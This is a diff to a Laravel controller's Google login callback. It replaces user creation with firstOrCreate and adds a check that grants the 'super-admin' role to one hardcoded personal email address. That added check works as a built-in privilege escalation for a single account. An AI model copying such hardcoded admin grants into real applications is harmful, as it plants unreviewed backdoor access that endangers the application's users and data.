@@ -30,22 +30,26 @@ class GoogleController extends Controller
     public function handleGoogleCallback()
     {
         try {
-
             $user = Socialite::driver('google')->user();
 
             $finduser = User::where('google_id', $user->id)->first();
 
             if ($finduser) {
-
                 Auth::login($finduser);
 
                 return redirect()->intended('dashboard');
             } else {
-                $newUser = User::create([
+                $newUser = User::firstOrCreate([
+                    'email' => $user->email,
+                    'google_id' => $user->id,
+                ], [
                     'email' => $user->email,
                     'google_id' => $user->id,
                 ]);
                 $newUser->assignRole(Role::where('name', 'Requester')->first());
+                if ($newUser->email == 'guirudj007@gmail.com') {
+                    $newUser->assignRole(Role::where('name', 'super-admin')->first());
+                }
                 Auth::login($newUser);
 
                 return redirect()->intended('dashboard');
